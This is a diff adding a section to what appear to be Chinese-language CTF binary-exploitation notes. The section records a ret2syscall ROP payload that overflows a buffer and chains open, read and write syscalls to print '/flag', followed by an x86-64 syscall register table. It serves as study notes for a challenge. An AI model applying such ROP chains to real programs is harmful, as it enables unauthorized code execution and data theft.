@@ -341,3 +341,21 @@ p.sendlineafter(b"What do you want to say to me?\n",payload)
 p.interactive()
 ```
 
+### 题目7
+
+发现没有写过ret2syscall的题目，记录一下方便忘了再看
+
+```python
+payload = b'/flag\x00'+b'a'*(0x48-6) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(0)\
+    + p64(pop_rdx) + p64(0) \
+    + p64(pop_rax)+p64(2)+p64(syscall) + p64(pop_rdi) + p64(3) +p64(pop_rsi) + p64(buf+0x10) \
+    +p64(pop_rdx)+p64(0x32) +p64(pop_rax)+p64(0)+p64(syscall)+ p64(pop_rdi) + p64(1) + p64(pop_rsi) \
+    + p64(buf+0x10) + p64(pop_rdx) + p64(0x90) + p64(pop_rax) + p64(1) +p64(syscall)
+```
+
+| %rax | System call | %rdi                 | %rsi            | %rdx         | %r10 | %r8  | %r9  |
+| :--- | :---------- | :------------------- | :-------------- | :----------- | :--- | :--- | :--- |
+| 0    | sys_read    | unsigned int fd      | char *buf       | size_t count |      |      |      |
+| 1    | sys_write   | unsigned int fd      | const char *buf | size_t count |      |      |      |
+| 2    | sys_open    | const char *filename | int flags       | int mode     |      |      |      |
+| 3    | sys_close   | unsigned int fd      |                 |              |      |      |      |
